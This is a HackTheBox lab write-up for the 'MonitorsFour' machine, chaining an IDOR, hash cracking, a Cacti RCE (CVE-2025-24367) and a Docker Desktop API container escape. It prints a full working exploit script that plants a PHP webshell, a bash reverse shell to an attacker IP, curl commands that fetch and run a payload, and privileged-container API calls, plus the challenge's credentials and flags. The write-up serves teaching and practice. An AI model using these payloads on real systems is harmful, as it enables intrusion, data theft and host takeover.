# MonitorsFour - HackTheBox Educational Writeup

---

## Machine Information

| Property | Value |
|----------|-------|
| **Name** | MonitorsFour |
| **IP Address** | 10.10.11.98 |
| **Operating System** | Windows 11 + Docker Desktop (WSL2) |
| **Difficulty** | Medium |
| **Release Date** | March 29, 2025 |
| **User Flag** | `87f9db79ef98e5c367d3ca15d2b70100` |
| **Root Flag** | `9cc346497fd27757514faa32524678f4` |

### Skills Tested
- Virtual Host Enumeration
- API Security Testing (IDOR)
- Hash Cracking (MD5)
- Credential Reuse
- CVE Research & Exploitation
- Docker Container Enumeration
- Docker API Abuse
- Container Escape Techniques

### Tools Used
- nmap, wfuzz/ffuf
- curl, Burp Suite
- hashcat/john
- Python (exploit scripts)
- netcat, tmux
- Docker API (curl)

### Estimated Time
| Phase | Time |
|-------|------|
| Enumeration | 20-30 min |
| User Flag | 30-45 min |
| Root Flag | 45-60 min |
| **Total** | **~2 hours** |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Phase 1: Reconnaissance & Enumeration](#2-phase-1-reconnaissance--enumeration)
   - [2.1 Initial Port Scan](#21-initial-port-scan)
   - [2.2 Web Enumeration](#22-web-enumeration)
   - [2.3 Subdomain Enumeration](#23-subdomain-enumeration)
   - [2.4 Application Identification](#24-application-identification)
3. [Phase 2: Vulnerability Discovery](#3-phase-2-vulnerability-discovery)
   - [3.1 API Endpoint Testing](#31-api-endpoint-testing)
   - [3.2 Token Parameter Vulnerability (IDOR)](#32-token-parameter-vulnerability-idor)
   - [3.3 Hash Cracking](#33-hash-cracking)
   - [3.4 Cacti Access](#34-cacti-access)
4. [Phase 3: Initial Access (CVE-2025-24367)](#4-phase-3-initial-access-cve-2025-24367)
   - [4.1 Vulnerability Research](#41-vulnerability-research)
   - [4.2 Exploitation Setup](#42-exploitation-setup)
   - [4.3 Exploitation Methods](#43-exploitation-methods)
   - [4.4 Shell Access](#44-shell-access)
5. [Phase 4: User Flag](#5-phase-4-user-flag)
6. [Phase 5: Privilege Escalation](#6-phase-5-privilege-escalation)
   - [6.1 Container Enumeration](#61-container-enumeration)
   - [6.2 Database Credential Discovery](#62-database-credential-discovery)
   - [6.3 Dead End: RSA Key Investigation](#63-dead-end-rsa-key-investigation)
   - [6.4 Docker Desktop Discovery](#64-docker-desktop-discovery)
   - [6.5 CVE-2025-9074 Exploitation](#65-cve-2025-9074-exploitation)
   - [6.6 Container Escape](#66-container-escape)
   - [6.7 Root Flag](#67-root-flag)
7. [Key Takeaways & Lessons Learned](#7-key-takeaways--lessons-learned)
8. [Appendix A: Complete Commands Reference](#appendix-a-complete-commands-reference)
9. [Appendix B: Exploit Scripts](#appendix-b-exploit-scripts)
10. [Appendix C: Failed Attempts Log](#appendix-c-failed-attempts-log)
11. [Appendix D: Quick Reproduction Steps](#appendix-d-quick-reproduction-steps)

---

## 1. Executive Summary

MonitorsFour is a unique HackTheBox machine that combines a web application vulnerability chain with a Docker Desktop container escape. Initial access begins with discovering a Cacti network monitoring subdomain via virtual host enumeration. An IDOR vulnerability in the main application's `/user` endpoint exposes MD5-hashed credentials when accessed with `token=0`. After cracking the hash for user "marcus," we leverage credential reuse to gain admin access to Cacti 1.2.28.

The Cacti instance is vulnerable to CVE-2025-24367, an authenticated RCE via graph template injection. By injecting malicious RRDtool commands into the `right_axis_label` parameter, we write a PHP webshell and obtain a reverse shell as `www-data` inside a Docker container.

Privilege escalation requires escaping the Docker container. After extensive enumeration, we discover the environment runs on Docker Desktop with WSL2. Crucially, Docker Desktop exposes its API at `192.168.65.7:2375` to internal containers (CVE-2025-9074). Using this API, we create a privileged container with the host filesystem mounted, navigate to the Windows C: drive, and retrieve the root flag.

**Key Vulnerabilities:**
| CVE/Vuln | Description | Impact |
|----------|-------------|--------|
| IDOR (token=0) | User endpoint exposes all credentials | Credential Disclosure |
| CVE-2025-24367 | Cacti RRDtool Graph Template Injection | RCE (www-data) |
| CVE-2025-9074 | Docker Desktop API Exposure | Container Escape → SYSTEM |

---

## 2. Phase 1: Reconnaissance & Enumeration

### 2.1 Initial Port Scan

**Objective:** Identify open ports and running services.

```bash
nmap -sC -sV -oA nmap/initial 10.10.11.98
```

**Flags Explained:**
- `-sC`: Run default scripts (banner grabbing, version detection scripts)
- `-sV`: Probe open ports for service/version info
- `-oA nmap/initial`: Output in all formats (XML, nmap, gnmap)

**Results:**
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Observations:**
1. Port 80 (HTTP) - Web server, primary attack surface
2. Port 5985 (WinRM) - Windows Remote Management, indicates Windows host
3. nginx on Linux + WinRM on Windows = possible containerized environment

**Lesson:** The combination of nginx (typically Linux) and WinRM (Windows-only) immediately suggests virtualization or containers. This is a key insight for later privilege escalation.

**Time Spent:** ~5 minutes

---

### 2.2 Web Enumeration

**Objective:** Understand the web application structure.

Browsing to `http://10.10.11.98` redirects to `http://monitorsfour.htb`.

```bash
# Add to hosts file
echo "10.10.11.98 monitorsfour.htb" | sudo tee -a /etc/hosts
```

**Technology Fingerprinting:**
```bash
curl -s -I http://monitorsfour.htb | grep -i "server\|x-powered"
```

**Result:** `nginx + PHP 8.3.27`

**Initial Observations:**
- Corporate website for "MonitorsFour Networking Solutions"
- Login form at main page
- Registration disabled
- API endpoints visible: `/api/v1/auth`, `/api/v1/reset`

**Lesson:** Always check for API endpoints. They often have weaker security controls than the main application.

---

### 2.3 Subdomain Enumeration

**Objective:** Discover additional virtual hosts.

**Why This Matters:** Many organizations host multiple applications on a single server using virtual hosts. The main site might be secure, but subdomains often have vulnerabilities.

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.monitorsfour.htb" --hh 13688 http://10.10.11.98
```

**Flags Explained:**
- `-c`: Colorized output
- `-z file,...`: Use wordlist as fuzzing source
- `-H "Host: FUZZ.monitorsfour.htb"`: Fuzz the Host header (vhost fuzzing)
- `--hh 13688`: Hide responses with 13688 bytes (default page size)

**Result:**
```
000000034:   302   "cacti"
```

**Discovery:** `cacti.monitorsfour.htb` exists!

```bash
echo "10.10.11.98 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

**Lesson:** Virtual host enumeration is essential. The main site (`monitorsfour.htb`) had no obvious vulnerabilities, but the subdomain (`cacti.monitorsfour.htb`) was the entry point.

---

### 2.4 Application Identification

**Objective:** Identify the application and version on the subdomain.

Browsing to `http://cacti.monitorsfour.htb/cacti/` reveals:

```bash
curl -s http://cacti.monitorsfour.htb/cacti/ | grep -i version
```

**Result:** `Cacti Version 1.2.28`

**What is Cacti?**
- Open-source network monitoring and graphing tool
- Uses RRDtool for data storage and graphing
- Common in enterprise environments
- Known for past vulnerabilities

**Quick Vulnerability Check:**
```bash
searchsploit cacti 1.2
```

**Relevant CVEs Found:**
- CVE-2025-24367: Authenticated RCE via Graph Template Injection (our target!)
- CVE-2024-25641: Arbitrary File Write (alternative, not used)

**Observation:** We need valid credentials to exploit CVE-2025-24367. This drives us back to the main site to find credentials.

---

## 3. Phase 2: Vulnerability Discovery

### 3.1 API Endpoint Testing

**Objective:** Test API endpoints for vulnerabilities.

**Discovered Endpoints:**
- `/api/v1/auth` - Authentication endpoint
- `/api/v1/reset` - Password reset
- `/user` - User information (interesting!)

**Initial Testing:**
```bash
# Standard auth attempt
curl -X POST http://monitorsfour.htb/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

**Result:** `{"error":"Invalid credentials"}`

**Failed Attempt:** Brute forcing common passwords yielded no results.

---

### 3.2 Token Parameter Vulnerability (IDOR)

**Discovery Process:**

While examining the password reset flow, I noticed the `/user` endpoint accepted a `token` parameter:

```bash
# Normal request
curl -s "http://monitorsfour.htb/user"
# Result: 401 Unauthorized

# Testing edge cases
curl -s "http://monitorsfour.htb/user?token=test"
# Result: 401 Unauthorized

curl -s "http://monitorsfour.htb/user?token=0"
# Result: ALL USER DATA!
```

**Vulnerability:** The application performs a falsy value check on the token parameter. When `token=0` (a falsy value in many languages), the check is bypassed, exposing all user records.

**Exposed Data:**
```json
[
  {"id":2,"username":"admin","password":"56b32eb43e6f15395f6c46c1c9e1cd36","name":"Marcus Higgins","role":"super user"},
  {"id":5,"username":"mwatson","password":"69196959c16b26ef00b77d82cf6eb169","name":"Michael Watson"},
  {"id":6,"username":"janderson","password":"2a22dcf99190c322d974c8df5ba3256b","name":"Jennifer Anderson"},
  {"id":7,"username":"dthompson","password":"8d4a7e7fd08555133e056d9aacb1e519","name":"David Thompson"}
]
```

**Why This Works:**
```python
# Pseudocode of vulnerable check
if token:  # When token=0, this evaluates to False!
    validate_token(token)
else:
    return all_users  # Oops!
```

**Lesson:** Always test edge cases like `0`, `-1`, `null`, `undefined`, empty strings. Type juggling and falsy value vulnerabilities are common.

---

### 3.3 Hash Cracking

**Objective:** Crack the MD5 hashes to obtain plaintext passwords.

**Hash Identification:**
- 32 characters, hexadecimal = MD5

```bash
# Quick verification
echo -n "test" | md5sum
# 098f6bcd4621d373cade4e832627b4f6

# Hash format matches - confirmed MD5
```

**Cracking Attempt:**
```bash
echo "56b32eb43e6f15395f6c46c1c9e1cd36" > admin.hash
hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt
```

**Result:**
```
56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1
```

**Credentials Obtained:** `marcus:wonderful1` (admin account for "Marcus Higgins")

**Verification:**
```bash
echo -n "wonderful1" | md5sum
# 56b32eb43e6f15395f6c46c1c9e1cd36 ✓
```

**Note:** Other hashes were not in rockyou.txt. In a real engagement, we'd try rule-based attacks, but we only need one valid account.

---

### 3.4 Cacti Access

**Objective:** Test credentials on Cacti application.

**Attempt 1: Default Credentials**
```
URL: http://cacti.monitorsfour.htb/cacti/
Username: admin
Password: admin
```

**Result:** Login successful, but limited permissions! The `admin` user can browse but cannot access critical features like Graph Templates.

**Attempt 2: Credential Reuse**
```
Username: marcus
Password: wonderful1
```

**Result:** Login successful with FULL ADMIN ACCESS!

**Observation:** The username from the main site (`marcus`) works on Cacti. This is credential reuse - a common vulnerability where the same credentials are used across multiple applications.

**Verified Access:**
- Console access: Full
- Graph Templates: Accessible (required for CVE-2025-24367)
- User Management: Full

**Lesson:** Always test discovered credentials across all application endpoints. Users frequently reuse passwords.

---

## 4. Phase 3: Initial Access (CVE-2025-24367)

### 4.1 Vulnerability Research

**CVE Details:**
| Property | Value |
|----------|-------|
| CVE ID | CVE-2025-24367 |
| Type | Authenticated Remote Code Execution |
| Affected | Cacti <= 1.2.28 |
| CVSS | 8.8 (High) |

**How It Works:**

1. Cacti uses RRDtool for creating graphs
2. Graph templates have a `right_axis_label` parameter
3. This parameter is passed unsanitized to RRDtool
4. RRDtool's `graph` command can write files with arbitrary content
5. By injecting PHP code, we can create webshells

**Vulnerable Code Flow:**
```
User Input → right_axis_label → RRDtool graph command → PHP file on disk
```

**Attack Vector:**
The `right_axis_label` field in Graph Template "Unix - Logged in Users" (ID 226) accepts multiline input. We inject RRDtool commands that:
1. Create an RRD file (required for graph command)
2. Generate a "graph" that's actually a PHP file with embedded code

---

### 4.2 Exploitation Setup

**Step 1: Add Hosts Entry**
```bash
echo "10.10.11.98 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

**Step 2: Create Reverse Shell Payload**
```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4455 0>&1' | sudo tee /var/www/html/bash
```

Replace `YOUR_IP` with your tun0 IP (`ip addr show tun0`).

**Step 3: Start Apache**
```bash
sudo systemctl start apache2
```

**Step 4: Start Persistent Listener**
```bash
# Using tmux for session persistence
tmux new-session -d -s shell "nc -lvnp 4455"

# To attach later:
tmux attach -t shell
```

**Why tmux?** If your terminal disconnects, the listener keeps running. Essential for long engagements.

---

### 4.3 Exploitation Methods

#### Method A: Automated Script (Recommended)

**exploit_working.py:**
```python
#!/usr/bin/env python3
"""CVE-2025-24367 - Cacti RCE via Graph Template Injection"""
import requests
import re

# CONFIG - Change these
LHOST = "YOUR_IP"      # Your tun0 IP
LPORT = "4455"
URL = "http://cacti.monitorsfour.htb"

s = requests.Session()

# Login
r = s.get(f'{URL}/cacti/index.php')
csrf = re.search(r'csrfMagicToken\s*=\s*"([^"]+)"', r.text).group(1)
s.post(f'{URL}/cacti/index.php', data={
    '__csrf_magic': csrf, 'action': 'login',
    'login_username': 'marcus', 'login_password': 'wonderful1'
})
print("[+] Logged in as marcus")

# Inject webshell via RRDtool graph template
r = s.get(f'{URL}/cacti/graph_templates.php?action=template_edit&id=226')
csrf = re.search(r'csrfMagicToken\s*=\s*"([^"]+)"', r.text).group(1)

# Payload creates shell.php with command execution via $_REQUEST[0]
rrdtool = """XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph shell.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`$_REQUEST[0]`;?>
"""

data = {
    "__csrf_magic": csrf, "name": "Unix - Logged in Users",
    "graph_template_id": "226", "graph_template_graph_id": "226",
    "save_component_template": "1", "right_axis_label": rrdtool,
    "title": "|host_description| - Logged in Users", "vertical_label": "users",
    "image_format_id": "3", "height": "200", "width": "700", "base_value": "1000",
    "slope_mode": "on", "auto_scale": "on", "auto_scale_opts": "2", "action": "save"
}

s.post(f'{URL}/cacti/graph_templates.php?header=false', data=data)
s.get(f'{URL}/cacti/graph_json.php?rra_id=0&local_graph_id=3')
print("[+] Webshell created at /cacti/shell.php")

# Test webshell
r = s.get(f'{URL}/cacti/shell.php?0=id')
print(f"[+] RCE confirmed: {r.text.split(',')[1].strip()}")

# Download and execute reverse shell
print(f"[*] Downloading shell script from http://{LHOST}/bash ...")
s.get(f'{URL}/cacti/shell.php?0=curl%20{LHOST}/bash%20-o%20/tmp/s.sh')

print("[*] Triggering reverse shell...")
try:
    s.get(f'{URL}/cacti/shell.php?0=bash%20/tmp/s.sh', timeout=2)
except:
    pass

print(f"\n[+] Check listener: tmux attach -t shell")
```

**Run:**
```bash
python3 exploit_working.py
```

---

#### Method B: Manual Browser Exploitation

1. **Login to Cacti** as `marcus:wonderful1`

2. **Navigate to Graph Templates:**
   - Console → Templates → Graph Templates
   - Click "Unix - Logged in Users" (ID 226)

3. **Inject Payload in Right Axis Label:**
```
XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph shell.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`$_REQUEST[0]`;?>
```

4. **Click Save**

5. **Trigger Graph Generation:**
   ```
   http://cacti.monitorsfour.htb/cacti/graph_json.php?local_graph_id=3
   ```

6. **Test Webshell:**
   ```
   http://cacti.monitorsfour.htb/cacti/shell.php?0=id
   ```

   **Expected Output:** `uid=33(www-data)...`

7. **Download Reverse Shell:**
   ```
   http://cacti.monitorsfour.htb/cacti/shell.php?0=curl%20YOUR_IP/bash%20-o%20/tmp/s.sh
   ```

8. **Trigger Shell:**
   ```
   http://cacti.monitorsfour.htb/cacti/shell.php?0=bash%20/tmp/s.sh
   ```

---

### 4.4 Shell Access

**Connection Received:**
```
tmux attach -t shell

listening on [any] 4455 ...
connect to [YOUR_IP] from (UNKNOWN) [10.10.11.98] 53934
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
```

**Observations:**
1. We're `www-data` (web server user)
2. Hostname `821fbd6a43fa` = Docker container ID
3. Working directory is `/var/www/html/cacti`

**Shell Upgrade (Optional):**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 5. Phase 4: User Flag

```bash
www-data@821fbd6a43fa:~$ cat /home/marcus/user.txt
87f9db79ef98e5c367d3ca15d2b70100
```

**User Flag:** `87f9db79ef98e5c367d3ca15d2b70100`

**Environment Check:**
```bash
cat /.dockerenv  # File exists = we're in Docker
hostname         # 821fbd6a43fa (container ID)
ip addr          # 172.18.0.3/16 (Docker network)
```

**Confirmed:** We're inside a Docker container. Root flag requires container escape.

---

## 6. Phase 5: Privilege Escalation

### 6.1 Container Enumeration

**Objective:** Understand the container environment and find escape vectors.

**Basic Enumeration:**
```bash
# Check kernel
uname -a
# Linux 6.6.87.2-microsoft-standard-WSL2

# Check network
ip route
# default via 172.18.0.1 dev eth0

# Check resolv.conf for hints
cat /etc/resolv.conf
# ExtServers: [host(192.168.65.7)]

# Check mounts
mount | grep -v "proc\|sys\|cgroup"
# overlay on / type overlay (... desktop-containerd ...)
```

**Key Discoveries:**
1. **WSL2 Kernel** - Running on Windows Subsystem for Linux 2
2. **Docker Desktop** - The mount paths show `desktop-containerd`
3. **Gateway:** 172.18.0.1
4. **Host reference:** 192.168.65.7

**Internal Network Scan:**
```bash
# Find other containers
for i in 1 2 3 4 5; do
  timeout 1 bash -c "echo > /dev/tcp/172.18.0.$i/22" 2>/dev/null && echo "172.18.0.$i:22 open"
done

# Results:
# 172.18.0.2 = mariadb container (port 3306 only)
# 172.18.0.3 = us (cacti container)
```

---

### 6.2 Database Credential Discovery

**Cacti Config File:**
```bash
cat /var/www/html/cacti/include/config.php | grep -E "database|user|pass"
```

**Result:**
```php
$database_hostname = 'mariadb';
$database_username = 'cactidbuser';
$database_password = '7pyrf6ly8qx4';
```

**Database Enumeration:**
```bash
mysql -h mariadb -u cactidbuser -p7pyrf6ly8qx4 cacti -e "SELECT username,password FROM user_auth"
```

**Results:**
| Username | Password Hash |
|----------|--------------|
| admin | `$2y$10$wqlo...` (bcrypt) |
| marcus | `$2y$10$bPWl...` (bcrypt) |
| guest | `43e9a4ab75570f5b` |

**Observation:** bcrypt hashes are slow to crack. We already have marcus's password anyway.

---

### 6.3 Dead End: RSA Key Investigation

**Discovery:**
```bash
mysql -h mariadb -u cactidbuser -p7pyrf6ly8qx4 cacti \
  -e "SELECT name,value FROM settings WHERE name LIKE '%key%'"
```

**Found:** A complete RSA private key stored in the `rsa_private_key` setting!

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2EsoB2toM0lwkaH5TtVE...
-----END RSA PRIVATE KEY-----
```

**Investigation Attempts:**
1. **SSH to containers:** No SSH service running anywhere
2. **SSH to host.docker.internal:** Port 22 closed
3. **SSH to 192.168.65.7:** Port 22 closed
4. **WinRM with key:** evil-winrm requires password, not key

**Conclusion:** The RSA key is used internally by Cacti for data collection encryption, NOT for authentication. This was a **red herring**.

**Lesson:** Not every credential or key is useful. Document dead ends to avoid repeating work.

**Time Lost:** ~20 minutes

---

### 6.4 Docker Desktop Discovery

**Key Insight:** The kernel version reveals WSL2:
```
6.6.87.2-microsoft-standard-WSL2
```

**Docker Desktop on Windows Architecture:**
```
Windows Host
    └── WSL2 VM
        └── Docker Desktop
            └── Containers (us)
```

**Known Docker Desktop Vulnerabilities:**
- Docker Desktop exposes its API to the internal network
- Default endpoint: `192.168.65.7:2375`
- No authentication required from containers!

---

### 6.5 CVE-2025-9074 Exploitation

**CVE-2025-9074: Docker Desktop API Exposure**

Docker Desktop exposes the Docker Engine API at `192.168.65.7:2375` to internal containers without authentication, regardless of the "Expose daemon on tcp://localhost:2375" setting.

**Verification:**
```bash
curl -s http://192.168.65.7:2375/version
```

**Result:**
```json
{
  "Version": "28.3.2",
  "ApiVersion": "1.51",
  "Os": "linux",
  "Arch": "amd64",
  "KernelVersion": "6.6.87.2-microsoft-standard-WSL2"
}
```

**We have unauthenticated access to the Docker API!**

---

### 6.6 Container Escape

**Step 1: List Available Images**
```bash
curl -s http://192.168.65.7:2375/images/json | grep RepoTags
```

**Available:** `alpine:latest`

**Step 2: Create Privileged Container with Host Mount**
```bash
curl -s -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "Tty": true,
    "OpenStdin": true,
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/mnt/host"]
    }
  }'
```

**Response:** `{"Id":"661652c6b7f5..."}`

**Step 3: Start Container**
```bash
curl -s -X POST http://192.168.65.7:2375/containers/661652c6b7f5.../start
```

**Step 4: Execute Commands**
```bash
# Create exec instance
EXEC_ID=$(curl -s -X POST "http://192.168.65.7:2375/containers/661652c6b7f5.../exec" \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["ls","-la","/mnt/host/mnt/host"],"AttachStdout":true,"AttachStderr":true}' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p')

# Run exec
curl -s -X POST "http://192.168.65.7:2375/exec/$EXEC_ID/start" \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":false}'
```

**Result:**
```
drwxrwxrwx    1 root root 4096 Dec  2 12:02 c      <- Windows C: drive!
drwxrwxrwt    3 root root   80 Jan  3 13:27 wsl
drwxrwxrwt    6 root root  240 Jan  3 13:27 wslg
```

**We have access to the Windows filesystem!**

---

### 6.7 Root Flag

**Path to Root Flag:**
```
/mnt/host/mnt/host/c/Users/Administrator/Desktop/root.txt
```

**Retrieval:**
```bash
EXEC_ID=$(curl -s -X POST "http://192.168.65.7:2375/containers/661652c6b7f5.../exec" \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["cat","/mnt/host/mnt/host/c/Users/Administrator/Desktop/root.txt"],"AttachStdout":true,"AttachStderr":true}' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p')

curl -s -X POST "http://192.168.65.7:2375/exec/$EXEC_ID/start" \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":false}'
```

**Root Flag:** `9cc346497fd27757514faa32524678f4`

---

## 7. Key Takeaways & Lessons Learned

### Summary Table

| Lesson | Context | Application |
|--------|---------|-------------|
| **Vhost fuzzing is essential** | Main site had no vulns; subdomain was entry point | Always enumerate subdomains |
| **Test edge cases (0, -1, null)** | token=0 bypassed authentication | Test falsy values on all parameters |
| **Credential reuse is common** | marcus's password worked on Cacti | Try credentials everywhere |
| **Default creds ≠ full access** | admin:admin gave limited access | Enumerate privilege levels |
| **Document dead ends** | RSA key was a red herring | Saves time on retry |
| **Recognize container environments** | nginx + WinRM = containers | Different privesc approach |
| **Know Docker Desktop internals** | API exposed at 192.168.65.7 | Container escape vector |
| **Use tmux for listeners** | Persistent shell across disconnects | Essential for long engagements |

### What to Try First Next Time

1. Vhost enumeration immediately after port scan
2. API endpoint testing with edge case values
3. Check for credential reuse across all discovered applications
4. In containers: check for Docker socket/API access early
5. In Docker Desktop: always try 192.168.65.7:2375

### Common Pitfalls Avoided

1. **Not enumerating subdomains** - Would have missed Cacti entirely
2. **Only testing valid tokens** - Would have missed IDOR
3. **Giving up after admin:admin worked** - Limited access wasn't enough
4. **Focusing on the RSA key** - Dead end, wasted time
5. **Not recognizing WSL2** - Key to finding the escape vector

---

## Appendix A: Complete Commands Reference

### Hosts Setup
```bash
echo "10.10.11.98 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Enumeration
```bash
# Port scan
nmap -sC -sV -oA nmap/initial 10.10.11.98

# Subdomain enumeration
wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.monitorsfour.htb" --hh 13688 http://10.10.11.98

# IDOR exploitation
curl -s "http://monitorsfour.htb/user?token=0"
```

### Hash Cracking
```bash
echo "56b32eb43e6f15395f6c46c1c9e1cd36" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Shell Setup
```bash
# Create payload
echo '#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4455 0>&1' | sudo tee /var/www/html/bash

# Start Apache
sudo systemctl start apache2

# Start listener
tmux new-session -d -s shell "nc -lvnp 4455"
```

### Docker API Escape
```bash
# Create privileged container
curl -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","HostConfig":{"Privileged":true,"Binds":["/:/mnt/host"]}}'

# Start container
curl -X POST http://192.168.65.7:2375/containers/CONTAINER_ID/start

# Execute command
curl -X POST http://192.168.65.7:2375/containers/CONTAINER_ID/exec \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["cat","/mnt/host/mnt/host/c/Users/Administrator/Desktop/root.txt"],"AttachStdout":true}'
```

---

## Appendix B: Exploit Scripts

### exploit_working.py
Located at: `/home/kali/Desktop/KaliBackup/OSCP/HackTheBox/MonitorsFour/exploit_working.py`

See [Section 4.3](#43-exploitation-methods) for full source code.

### Usage:
```bash
# Edit LHOST in script first
python3 exploit_working.py
tmux attach -t shell
```

---

## Appendix C: Failed Attempts Log

| Attempt | Expected | Actual | Reason |
|---------|----------|--------|--------|
| Brute force login | Find password | No valid creds | rockyou too slow on bcrypt |
| SSH to containers | SSH access | Port 22 closed | No SSH installed |
| SSH with RSA key | Host access | No SSH anywhere | Key for Cacti internal use |
| WinRM with marcus creds | Windows shell | Auth failed | Different password on Windows |
| Mount /mnt/c in container | Windows drive | Empty directory | Container isolation |
| vsock escape | VM escape | No vsock device | Not exposed to containers |

---

## Appendix D: Quick Reproduction Steps

**Time: ~15 minutes if you know the path**

```bash
# 1. Setup
echo "10.10.11.98 monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
echo '#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4455 0>&1' | sudo tee /var/www/html/bash
sudo systemctl start apache2
tmux new-session -d -s shell "nc -lvnp 4455"

# 2. Get credentials
curl -s "http://monitorsfour.htb/user?token=0" | grep -oP '"password":"\K[^"]+'
# Crack: 56b32eb43e6f15395f6c46c1c9e1cd36 = wonderful1

# 3. Run exploit (after editing LHOST)
python3 exploit_working.py

# 4. In shell - get user flag
cat /home/marcus/user.txt

# 5. Privesc - Docker API escape
curl -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Privileged":true,"Binds":["/:/mnt/host"]}}'
# Note the container ID, then:
curl -X POST http://192.168.65.7:2375/containers/CONTAINER_ID/start

# 6. Get root flag via exec API
# (See Section 6.7 for full commands)
```

---

*Last Updated: January 2026*
*Author: Educational purposes only*
